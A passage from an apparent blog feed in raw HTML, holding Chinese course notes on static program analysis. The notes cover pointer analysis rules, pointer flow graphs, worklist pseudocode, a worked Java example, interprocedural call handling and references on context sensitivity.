class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddEdge</span><span class="params">(s, t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> s → t ∉ PFG:</span><br><span class="line">        add s → t to PFG  <span class="comment"># 将s → t加入PFG</span></span><br><span class="line">        <span class="keyword">if</span> pt(s) <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">            add &lt;t, pt(s)&gt; to WL <span class="comment"># 将&lt;t,s指向内容&gt;加入工作队列</span></span><br></pre></td></tr></table></figure><p>Dispatch()：</p><script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script><h1 id="Related-work"><a href="#Related-work" class="headerlink" title="Related work"></a>Related work</h1><ol><li>Olin Shivers, 1991. “Control-Flow Analysis of Higher-Order Languages”. Ph.D. Dissertation. Carnegie Mellon University.</li><li>Ana Milanova, Atanas Rountev, and Barbara G. Ryder. “Parameterized Object Sensitivity for Points-to and Side-Effect Analyses for Java”. ISSTA 2002.</li><li>Yannis Smaragdakis, Martin Bravenboer, and Ondrej Lhoták. “Pick Your Contexts Well: Understanding Object-Sensitivity”. POPL 2011.</li><li>Yue Li, Tian Tan, Anders Møller, and Yannis Smaragdakis. “A Principled Approach to Selective Context Sensitivity for Pointer Analysis”. TOPLAS 2020.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;h2 id=&quot;Problem-of-Context-Insensitive-C-I&quot;&gt;&lt;a href=&quot;#Problem-of-Context-Insensitive-C-I&quot; class=&quot;headerlink&quot; title=&quot;Problem of Context-Insensitive (C.I.)&quot;&gt;&lt;/a&gt;Problem of Context-Insensitive (C.I.)&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;每次函数调用时，调用的上下文不一样；&lt;/li&gt;
&lt;li&gt;在不同的调用上下文里，函数内的变量会指向不同；&lt;/li&gt;
&lt;li&gt;在上下文不敏感的指针分析中，函数内的对象指向的内容是不同上下文混合起来的（如上例中 $n$ 指向 $o_1$ 和 $o_2$），而这些内容会后向传播，造成更多不准确的结果。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="静态程序分析" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="过程间分析" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>静态程序分析课程笔记（指针分析）</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://anemone.top/pl-静态程序分析课程笔记（指针分析）/</id>
    <published>2020-08-18T13:22:13.000Z</published>
    <updated>2020-08-30T12:48:13.085Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>CHA 只看定义类型，会得到很多实际不被调用的子类方法，如下图所示，CHA的常量分析时只能得到NAC</p><p>而指针分析会得到更精确的对象类型：</p><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200818213708639.png" alt="image-20200818213708639"></p><h1 id="Introduction-to-Pointer-Analysis"><a href="#Introduction-to-Pointer-Analysis" class="headerlink" title="Introduction to Pointer Analysis"></a>Introduction to Pointer Analysis</h1><blockquote><p>A fundamental static analysis, computes which memory locations a pointer can point to.</p><p>For object-oriented programs, computes which objects a pointer (variable or field) can point to.</p></blockquote><a id="more"></a><p>即指针分析[1]用于分析一个指针究竟指向哪一块内存，对于面向对象程序，指针分析可用于分析一个指针指向哪一个变量或者域。</p><p>指针分析是may分析。</p><h2 id="指针分析和别名分析"><a href="#指针分析和别名分析" class="headerlink" title="指针分析和别名分析"></a>指针分析和别名分析</h2><ul><li><p>指针分析回答指针指向哪一个对象（内存）的问题</p></li><li><p>别名分析回答两个指针是否指向同一对象（内存）的问题</p></li></ul><h2 id="指针分析的应用"><a href="#指针分析的应用" class="headerlink" title="指针分析的应用"></a>指针分析的应用</h2><ul><li>基础信息构建<ul><li>Call graph、别名分析</li></ul></li><li>编译器优化</li><li>Bug检测<ul><li>空指针异常</li></ul></li><li>安全分析<ul><li>信息流分析</li></ul></li></ul><h1 id="Key-Factors-of-Pointer-Analysis"><a href="#Key-Factors-of-Pointer-Analysis" class="headerlink" title="Key Factors of Pointer Analysis"></a>Key Factors of Pointer Analysis</h1><p>指针分析是一个复杂系统，很多因素影响了指针分析的准确度和效率：</p><div class="table-container"><table><thead><tr><th>Factor</th><th>Problem</th><th>Choice</th></tr></thead><tbody><tr><td>Heap abstraction</td><td>如何对堆内存建模</td><td>1. Allocation site*; 2. Storeless</td></tr><tr><td>Context sensitivity</td><td>是否上下文敏感</td><td>1. Context-sensitive*; 2. Context-insensitive*</td></tr><tr><td>Flow sensitivity</td><td>是否流敏感</td><td>1. Flow-sensitive; 2. Flow-insensitive*</td></tr><tr><td>Analysis scope</td><td>分析范围</td><td>1. Whole-program*; 2. Demand-driven</td></tr></tbody></table></div><p>打“*”号的为本课程介绍的分析方法。</p><h2 id="Heap-Abstraction-堆抽象"><a href="#Heap-Abstraction-堆抽象" class="headerlink" title="Heap Abstraction(堆抽象)"></a>Heap Abstraction(堆抽象)</h2><p>在静态分析视角中，程序中会创建无限数量的对象实例（考虑到难以分析循环/递归终止条件），为了保证指针分析能够终止，需要将无限数量的对象抽象为有限数量的对象<br><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200820210803574.png" alt="image-20200820210803574"></p><p>如上图所示，主要有两大流派[2]：</p><ul><li>Store based model</li><li>Storeless model</li></ul><p>其中，Store based model 中的 Allocation sites 较为常用，其抽象依据是同一创建点的对象为同一对象：</p><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200820211117510.png" alt="image-20200820211117510"></p><h2 id="上下文敏感"><a href="#上下文敏感" class="headerlink" title="上下文敏感"></a>上下文敏感</h2><p>指针分析过程中如何对调用上下文建模，主要分为两种</p><ul><li>上下文敏感<ul><li>每一个上下文分析一次 </li><li>每次调用时，不同上下文方法对象不一样，重复分析函数</li></ul></li><li>上下文不敏感<ul><li>同一个函数只分析一次</li><li>分析时合并所有调用的输入</li><li>一般地精度较低</li></ul></li></ul><p>下图左侧为上下文敏感，右侧为上下文不敏感：</p><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200820211514827.png" alt="image-20200820211514827"></p><p>个人认为对于特定的分析（如污点分析）做好函数摘要（summary）后，就可以做上下文不敏感的分析，同时不损失精度。</p><h2 id="流敏感"><a href="#流敏感" class="headerlink" title="流敏感"></a>流敏感</h2><p>做指针分析时，对控制流的处理</p><ul><li>控制流敏感<ul><li>考虑执行顺序</li><li>维护每一程序点的指针指向关系</li></ul></li><li>控制流不敏感<ul><li>保存所有可能指向的对象</li></ul></li></ul><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200820212053813.png" alt="image-20200820212053813"></p><p>如上图代码中，控制流敏感（蓝色）对每个程序点都做了记录，而控制流不敏感（橘色）则保存指针的所有可能指向；</p><p>先前的数据流分析都是流敏感的，而在java语言的指针分析中，Flow-sensitive效果未必比Flow-insensitive好，因此主要介绍 insensitive。</p><h2 id="Analysis-Scope"><a href="#Analysis-Scope" class="headerlink" title="Analysis Scope"></a>Analysis Scope</h2><p>指针分析可以分析全程序，也可根据需要分析部分代码中的指针信息：</p><ul><li>Whole-program<ul><li>分析程序所有信息</li></ul></li><li>Demand-driven<ul><li>分析部分指针信息 </li><li>计算量比全程序小</li><li>但考虑到依赖，所以计算速度未必更快</li></ul></li></ul><h1 id="Concerned-Statements"><a href="#Concerned-Statements" class="headerlink" title="Concerned Statements"></a>Concerned Statements</h1><h2 id="Java中的指针"><a href="#Java中的指针" class="headerlink" title="Java中的指针"></a>Java中的指针</h2><ul><li><p>本地变量（local variable），e.g., <code>x</code></p></li><li><p>静态域（static field）, e.g., <code>C.f</code>，作为全局变量分析，与本地变量分析方法类似（本课不做讨论）</p></li><li><p>对象域（instance field），e.g., <code>x.f</code>，实例对象的属性</p></li><li><p>数组元素（array element），e.g., array[i]，由于静态分析没法计算数组下标，通用做法将其作为single field，与处理instance field类似（本课不做讨论）<br><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200820212836084.png" alt="image-20200820212836084"></p><p>如上图所示，原先数组下表的访问<code>array[0]</code> 变为<code>array.arr</code>。</p></li></ul><h2 id="与指针分析相关的语句"><a href="#与指针分析相关的语句" class="headerlink" title="与指针分析相关的语句"></a>与指针分析相关的语句</h2><ul><li>New: <code>x = new T()</code></li><li>Assign: <code>x = y</code></li><li>Store: <code>x.f = y</code></li><li>Load: <code>y = x.f</code></li><li>Call: <code>r = x.k (a, ...)</code></li></ul><p>注意对于真实场景下 <code>x.f.g.h=y</code> 的情况，在三地址码表示时可以用临时变量做简化，变为<code>t1=x.f; t2=t1.g; t2.h=y</code></p><p>对于对象调用(Call)语句，存在三种调用类型：</p><ul><li><p>Static call：<code>C.foo()</code></p></li><li><p>Special call: <code>super.foo()/x.&lt;init&gt;()/this.privateFoo()</code></p></li><li><p>Virtual call: <code>x.foo()</code></p></li></ul><p>由于 static call和special all 都只有一种函数原型，因此只需分析virtual call的情况。</p><h1 id="Pointer-Analysis-Rules"><a href="#Pointer-Analysis-Rules" class="headerlink" title="Pointer Analysis: Rules"></a>Pointer Analysis: Rules</h1><h2 id="Domains-and-Notations"><a href="#Domains-and-Notations" class="headerlink" title="Domains and Notations"></a>Domains and Notations</h2><p>以下为需要用到的定义：</p><ul><li><p>变量：$x,y \in V$</p></li><li><p>域（Fields）：$f,g\in F$</p></li><li><p>对象（Objects）：$o_i, o_j \in O$</p></li><li>实例属性（Instance fields）：$o_i.f, o_j.g \in O \times F$</li><li>指针：$Pointer = V \cup (O \times F)$</li></ul><p>注：</p><ul><li>$P(O)$ 指$O$的幂集</li><li><p>$pt(p)$ 表示指向 $p$ 的指针集合</p><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2></li></ul><p>$\frac{a}{b}$为推导符号，即如果条件 $a$ 满足，那么 $b$ 也满足（在infer那也介绍过此符号），个人感觉可以理解为$\{a\}stmt\{b\}$，也可以理解为满足$a$ 后，进行$b$操作。</p><ul><li><p>New，<code>i: x = new T()</code>，</p><p>新建对象时， $o_i$ 加入指针集中 (写法不同）</p><script type="math/tex; mode=display">\frac{}{o_i \in pt(x)}</script></li><li><p>Assign, <code>x = y</code></p><script type="math/tex; mode=display">\frac{o_{i} \in p t(y)}{o_{i} \in p t(x)}</script><p>出现赋值后，让y指向的内容指向x；</p></li><li><p>Store, <code>x.f = y</code></p><script type="math/tex; mode=display">\frac{o_i \in pt(x), o_j \in pt(y)}{o_j \in pt(o_i.f)}</script><p>赋值给属性时，将指向 $y$ 的指针也放入 $o_{i}.f$ 的集合中</p></li><li><p>Load, <code>y = x.f</code></p><script type="math/tex; mode=display">\frac{o_{i} \in p t(x), o_{j} \in p t\left(o_{i} . f\right)}{o_{j} \in p t(y)}</script><p>属性赋值给变量时，指向 $o_i.f$ 的指针指向 $y$</p></li></ul><p>下图给出四种情况的形象表示：</p><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200821212128271.png" alt="image-20200821212128271"></p><h1 id="How-to-Implement-Pointer-Analysis"><a href="#How-to-Implement-Pointer-Analysis" class="headerlink" title="How to Implement Pointer Analysis"></a>How to Implement Pointer Analysis</h1><blockquote><p>Pointer analysis is to propagate points-to information among pointers (variables &amp; fields).</p></blockquote><p>指针分析就是在变量和域（指针）中传递指向内存的信息。</p><p>也有观点是指针分析就是求解一系列指针的约束条件[3]。</p><h2 id="Pointer-Flow-Graph"><a href="#Pointer-Flow-Graph" class="headerlink" title="Pointer Flow Graph"></a>Pointer Flow Graph</h2><p>因此使用图来保存指针之间的关系，当指针 x 变化时，同时需要改变 x 后继指针的指向内容。</p><blockquote><p>Pointer flow graph of a program is a directed graph  that expresses how objects flow among the pointers in the program.</p></blockquote><p>图中的点为指针（变量或者抽象对象实例的域/属性）：</p><p>Nodes：$Pointer = V \cup (O \times F)$</p><p>图中的边 $x \rightarrow y $ 表示指针 $x$ 指向的对象也被 $y$ 指向（$x$ 的指针信息流向 $y$ ）</p><p>Edges：$Pointer \times Pointer$</p><p>因此，先前的四条语句产生的边可以用下图表示：</p><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200823104858792.png" alt="image-20200823104858792"></p><h1 id="Pointer-Analysis-Algorithms"><a href="#Pointer-Analysis-Algorithms" class="headerlink" title="Pointer Analysis: Algorithms"></a>Pointer Analysis: Algorithms</h1><h2 id="Worklist"><a href="#Worklist" class="headerlink" title="Worklist"></a>Worklist</h2><p>$WL \subseteq      \left \langle Pointer, \mathcal{P}(O)\right \rangle^*$， 即WL中的元素为$n, pts$，表示指针$n$可能指向的内存/对象集合为 $pts$</p><h2 id="加边函数-AddEdge-："><a href="#加边函数-AddEdge-：" class="headerlink" title="加边函数 AddEdge()："></a>加边函数 AddEdge()：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddEdge</span><span class="params">(s, t)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> s → t ∉ PFG:</span><br><span class="line">        add s → t to PFG  <span class="comment"># 将s → t加入PFG</span></span><br><span class="line">        <span class="keyword">if</span> pt(s) <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">            add &lt;t, pt(s)&gt; to WL <span class="comment"># 将&lt;t,s指向内容&gt;加入工作队列</span></span><br></pre></td></tr></table></figure><p>即若添加 $s \rightarrow t$ ，首先检查该边是否在PFG中，若不存在，则将该边加入PFG；并且检查 s 指向的内存集合，如果集合不空，则需保证 $s$ 指向的内容被 $t$ 指向，即加入工作队列中。</p><h2 id="指针传播函数-Propagate-："><a href="#指针传播函数-Propagate-：" class="headerlink" title="指针传播函数 Propagate()："></a>指针传播函数 Propagate()：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Propagate</span><span class="params">(n, pts)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    n: 指针n</span></span><br><span class="line"><span class="string">    pts: n可能指向的新的指针集合</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> pts <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        pt(n) ⋃= pts <span class="comment"># 将pts内容存入到指针指向的集合中</span></span><br><span class="line">        <span class="keyword">for</span> each n → s ∈ PFG</span><br><span class="line">        add s, pts to WL</span><br></pre></td></tr></table></figure><p>即 pts 不为空时，将 $pts$ 内容存入 $n$ 的指针集合中，接着找n的后继s，对每一个s，将 &lt;s, pts&gt; 加入WL。</p><h2 id="主函数-Solve-："><a href="#主函数-Solve-：" class="headerlink" title="主函数 Solve()："></a>主函数 <code>Solve()</code>：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: 程序所有语句</span></span><br><span class="line"><span class="string">    WL：工作队列</span></span><br><span class="line"><span class="string">    PFG： Pointer flow graph</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] 表示指针n可能会指向pts集合（每次迭代就会有新的可能）</span></span><br><span class="line">PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;𝑜𝑖&#125;&gt;&#125; 表示指针x指向对象𝑜𝑖</span></span><br><span class="line"><span class="keyword">for</span> each i: x = new T() ∈ 𝑆: <span class="comment"># 处理 new stmt</span></span><br><span class="line">add &lt;x, &#123;𝑜𝑖&#125;&gt; to WL </span><br><span class="line"><span class="keyword">for</span> each x = y ∈ S: <span class="comment"># 处理 assign stmt</span></span><br><span class="line">AddEdge(y, x)</span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Δ = pts - pt(n)</span><br><span class="line">        Propagate(n, Δ)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each 𝑜𝑖 ∈ Δ:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y ∈ S: <span class="comment"># 处理 store stmt</span></span><br><span class="line">                    AddEdge(y, 𝑜𝑖.𝑓)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f ∈ S: <span class="comment"># 处理 load stmt</span></span><br><span class="line">                    AddEdge(𝑜𝑖.𝑓, y)</span><br></pre></td></tr></table></figure><p>首先可以看到，在9、11、19和21行分别处理了new、assign、store和load操作：</p><ul><li><p>对于new操作，直接将 $\left \langle x, o_i \right\rangle$ 加入worklist</p></li><li><p>对于assign操作，将x指向的内容也被y指向，即调用<code>AddEdge()</code></p></li></ul><p>接下来进入循环，直到工作队列为空：</p><ol><li><p>取出队头要处理的指针n和其对应的pts</p></li><li><p>求差异 Δ，pts中的有一些地址先前已经传播过，只需处理剩余部分</p></li><li><p>调用<code>Propogate()</code>，将 Δ 内容放入 $pt(n)$ 并且添加新的work</p></li></ol><p>接着需要处理对象操作，17-18的行意指若指针n表示的是一个变量（而不是field)，那么对于每一个 Δ 中的对象实例，处理所有与 $x.f$ 相关的 store 和 load 操作，对 store 和 load 操作都是使用<code>AddEdge()</code>处理（19-22行）。</p><h2 id="具体示例"><a href="#具体示例" class="headerlink" title="具体示例"></a>具体示例</h2><p>考虑如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="keyword">new</span> C();</span><br><span class="line">a = b;</span><br><span class="line">c = <span class="keyword">new</span> C();</span><br><span class="line">c.f = a;</span><br><span class="line">d = c;</span><br><span class="line">c.f = d;</span><br><span class="line">e = d.f;</span><br></pre></td></tr></table></figure><p>首先经过<code>solve():L9-12</code>的初始化：</p><ul><li><p>WL=[&lt;b,{o1}&gt;, &lt;c,{o3}&gt;]</p></li><li><p>PFG:</p><pre class="mermaid">  graph RL    b("b{}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p>处理&lt;b,{o1}&gt;: 主要执行第16行<code>Propagate()</code></p><ul><li><p>WL=[&lt;c,{o3}&gt;, &lt;a,{o1}&gt;]，因为b→a，所以增加了一个新work</p></li><li><p>PFG:</p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{}") --> d("d{}")</pre></li></ul><p>处理&lt;c, {o3}&gt;：除了<code>propagate(c, {o3})</code>，注意到第 4 行和第 6 行，所以还需处理store，即<code>AddEdge(a,o3.f)</code>,<code>AddEdge(d,o3.f)</code>，因为目前 a 和 d 指向内容都是空集，所以 WL 不增加</p><ul><li><p>WL=[&lt;a,{o1}&gt;, &lt;d,{o3}&gt;]</p></li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p>处理&lt;a,{o1}&gt;：<code>propagate(a, {o1})</code></p><ul><li><p>WL=[&lt;d,{o3}&gt;, &lt;o3.f, {o1}&gt;]</p></li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{}")    a-->o3.f["o3.f{}"]     d-->o3.f</pre></li></ul><p>处理&lt;d,{o3}&gt;：<code>propagate(d, {o3})</code>, 以及注意到第 7 行的 load 语句，调用<code>AddEdge(o3.f,e)</code></p><ul><li><p>WL=[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</p></li><li><p>PFG:    </p><pre class="mermaid">  graph RL    b("b{o1}") --> a("a{o1}")    c("c{o3}") --> d("d{o3}")    a-->o3.f["o3.f{}"]     d-->o3.f    o3.f --> e("e{}")</pre></li></ul><p>后面步骤省略，最后 PFG 结果为：</p><pre class="mermaid">graph RL      b("b{o1}") --> a("a{o1}")      c("c{o3}") --> d("d{o3}")      a-->o3.f["o3.f{o1, o3}"]       d-->o3.f      o3.f --> e("e{o1, o3}")</pre><p>可以看到 PFG 中已经记录了每个指针变量可能指向的对象。</p><h1 id="Pointer-Analysis-with-Method-Calls"><a href="#Pointer-Analysis-with-Method-Calls" class="headerlink" title="Pointer Analysis with Method Calls"></a>Pointer Analysis with Method Calls</h1><p>在分析 call statments 时，需要做过程间分析，即需要构建 call graph，已知的 CHA 构建的 call graph 是不准确的，本节课介绍如何使用指针分析本身构建 call graph，即完成跨函数的指针分析。</p><h2 id="Rule-Call"><a href="#Rule-Call" class="headerlink" title="Rule: Call"></a>Rule: Call</h2><p>对于之前忽略的 Call stmt，有如下推导规则：</p><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200823202143283.png" alt="image-20200823202143283"></p><p>主要有4部分：</p><ol><li>由 $Dispatch(o_i, k)$ 获取目标方法，$Dispatch()$ 实现与之前 CHA 分析相同：<script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script></li><li><p>被$x$ 指向的对象$o_i$ ，也被 $m_{this}$ 指向；</p></li><li><p>对于每一个实参$a_j$所指向的信息，也被形参 $m_{pj}$ 所指向——在PFG上增加 “实参→形参”边；</p></li><li><p>对于被返回值 $m_{ret}$ 指向的对象$o_v$，也被等号左边变量 $r$ 指向——在PFG上增加“ret→r”的边。</p></li></ol><p><strong>讨论为什么对于 $m_{this}$ 不增加边，而对其他参数就增加边：</strong></p><p>注意到 $x$ 指向的信息是一个集合，而 $m_{this}$ 由$Dispatch()$ 解析后可以唯一确定一个对象，换句话说：</p><ol><li><p>对于this来说，指针分析已经可以唯一确定该对象实例，若传递 $x$ 的指向对象集合反而造成分析不准确，如下图所示：</p><p><img src="/pl-静态程序分析课程笔记（指针分析）/image-20200823204227690.png" alt="image-20200823204227690"></p></li><li><p>对于其他参数，指针分析无法确定它们的唯一对象实例，为保证may分析，需要传递先前所有可能性，即可能指向的集合。</p></li></ol><p>归根结底，this和不同参数还是有区别的，this的实例参与了 Dispatch 过程。</p><h2 id="Interprocedural-pointer-analysis"><a href="#Interprocedural-pointer-analysis" class="headerlink" title="Interprocedural pointer analysis"></a>Interprocedural pointer analysis</h2><ol><li>和其他过程间分析一样，过程间指针分析需要指定一个函数入口</li><li>过程间指针分析一边做<strong>指针分析</strong>，一边构造<strong>调用图</strong></li><li>由入口出发不断探索未知函数，直到所有可被探索的函数都被处理完成，这样既可以提高效率，又可以提高精度</li></ol><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Solve</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S: 程序所有语句</span></span><br><span class="line"><span class="string">    WL: 工作队列</span></span><br><span class="line"><span class="string">    PFG: Pointer flow graph</span></span><br><span class="line"><span class="string">    S: 可达所有语句集合 s_m表示函数m的所有语句集合</span></span><br><span class="line"><span class="string">    RM: 可达所有函数集合</span></span><br><span class="line"><span class="string">    CG: 调用图，保存边</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    WL = [] <span class="comment"># e.g., [&lt;n, pts&gt;] 表示指针n可能会指向pts集合（每次迭代就会有新的可能）</span></span><br><span class="line">    PFG = &#123;&#125; <span class="comment"># e.g., &#123;&lt;x, &#123;𝑜𝑖&#125;&gt;&#125; 表示指针x指向对象𝑜𝑖</span></span><br><span class="line">    S = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    RM = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    CG = &#123;&#125; <span class="comment"># added</span></span><br><span class="line">    AddReachable(m) <span class="comment"># difference</span></span><br><span class="line">    <span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">        remove n, pts <span class="keyword">from</span> WL</span><br><span class="line">        Δ = pts - pt(n)</span><br><span class="line">        Propagate(n, Δ)</span><br><span class="line">        <span class="keyword">if</span> n represents a variable x:</span><br><span class="line">            <span class="keyword">for</span> each 𝑜𝑖 ∈ Δ:</span><br><span class="line">                <span class="keyword">for</span> each x.f = y ∈ S: <span class="comment"># 处理 store stmt</span></span><br><span class="line">                    AddEdge(y, 𝑜𝑖.𝑓)</span><br><span class="line">                <span class="keyword">for</span> each y = x.f ∈ S: <span class="comment"># 处理 load stmt</span></span><br><span class="line">                    AddEdge(𝑜𝑖.𝑓, y)</span><br><span class="line">                ProcessCall(x, 𝑜𝑖) <span class="comment"># added</span></span><br></pre></td></tr></table></figure><p>与单函数的指针分析不同，主要变化在12、13、14、15和26行，在函数初始化阶段，增加可达语句集合、可达函数集合和调用图，以及对 new 和 assign 的处理放在了 <code>AddReachable()</code> 函数中，在变化的每个对象实例中，通过 <code>ProcessCall()</code>处理call stmt——当n为一个变量时调用。</p><h3 id="AddReachable-m"><a href="#AddReachable-m" class="headerlink" title="AddReachable(m)"></a>AddReachable(m)</h3><p><code>AddReachable(m)</code>函数用于将新的方法 $m$ 加入可达集合中，同时处理 $m$ 中 new 和 assign 语句，处理方法与单函数类似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddReachable</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> m ∉ RM:</span><br><span class="line">        <span class="comment"># 添加新的已知方法和语句</span></span><br><span class="line">        add m to RM</span><br><span class="line">        S ∪= S_m</span><br><span class="line">        <span class="comment"># 更新 worklist 和 PFG</span></span><br><span class="line">        <span class="keyword">for</span> each i: x = new T() ∈ S_m:</span><br><span class="line">            add &lt;x, &#123;𝑜𝑖&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">for</span> each x = y ∈ S_m:</span><br><span class="line">            AddEdge(y, x)</span><br></pre></td></tr></table></figure><h3 id="ProcessCall-x-𝑜𝑖"><a href="#ProcessCall-x-𝑜𝑖" class="headerlink" title="ProcessCall(x, 𝑜𝑖)"></a>ProcessCall(x, 𝑜𝑖)</h3><p>$ProcessCall(x,o_i)$ 用于处理 call 语句，算法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span 